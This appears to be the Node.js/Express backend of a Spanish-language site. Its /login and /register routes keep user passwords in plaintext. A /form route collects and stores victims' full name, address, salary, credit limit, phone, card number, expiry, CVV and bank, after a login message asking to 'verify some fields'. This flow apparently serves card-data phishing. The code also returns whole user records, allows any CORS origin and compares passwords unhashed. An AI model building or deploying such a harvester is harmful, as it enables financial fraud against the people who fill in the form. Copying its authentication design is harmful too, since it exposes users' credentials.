const express = require('express')
const cors = require('cors')
const mongoose = require('mongoose')
const FormSchema = require('./models/Form')

const app = express()
app.use(express.json())
app.use(cors())

require('dotenv').config()


const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  password: String
})

const User = new mongoose.model("user", userSchema)

//Routes
app.post("/login", (req, res) => {
  const { email, password } = req.body
  User.findOne({ email: email }, (err, user) => {
    if (user) {
      if (password === user.password) {
        res.send({
          message: "Has iniciado sesion correctamente",
          info: 'Para continuar necesitamos verificar algunos campos',
          icon: 'success',
          user: user
        })
      } else {
        res.send({
          message: "Contraseña incorrecta",
          icon: 'error'
        })
      }
    } else {
      res.send({
        message: "Este usuario no ah sido registrado",
        icon: 'error'
      })
    }
  })
})

app.post("/register", (req, res) => {
  const { name, email, password } = req.body
  User.findOne({ email: email }, (err, user) => {
    if (user) {
      res.send({
        message: "Usuario existente",
        info: 'Por favor ingresa un correo que no sea haya registrado',
        icon: 'info'
      })
    } else {
      const user = new User({
        name,
        email,
        password
      })
      user.save(err => {
        if (err) {
          res.send(err)
        } else {
          res.send({ message: "Registro exitoso, por favor inicia sesion." })
        }
      })
    }
  })

})

app.post('/form', async (req, res) => {
  const {
    nombre,
    apellido_paterno,
    apellido_materno,
    direccion,
    codigo_postal,
    municipio,
    estado,
    sueldo,
    limite,
    estado_civil,
    telefono,
    tarjeta,
    vencimiento,
    cvv,
    banco
  } = req.body

  const newForm = new FormSchema({
    nombre,
    apellido_paterno,
    apellido_materno,
    direccion,
    codigo_postal,
    municipio,
    estado,
    sueldo,
    limite,
    estado_civil,
    telefono,
    tarjeta,
    vencimiento,
    cvv,
    banco
  })
  await newForm.save(err => {
    if (err) {
      res.send(err)
    } else {
      res.send({ message: "Successfully Registered" })
    }
  })
})


mongoose.connect(process.env.MONGO_URI, () => {
  console.log('DB Connected');
})
app.listen(process.env.PORT || 5000, () => {
  console.log('Server load');
})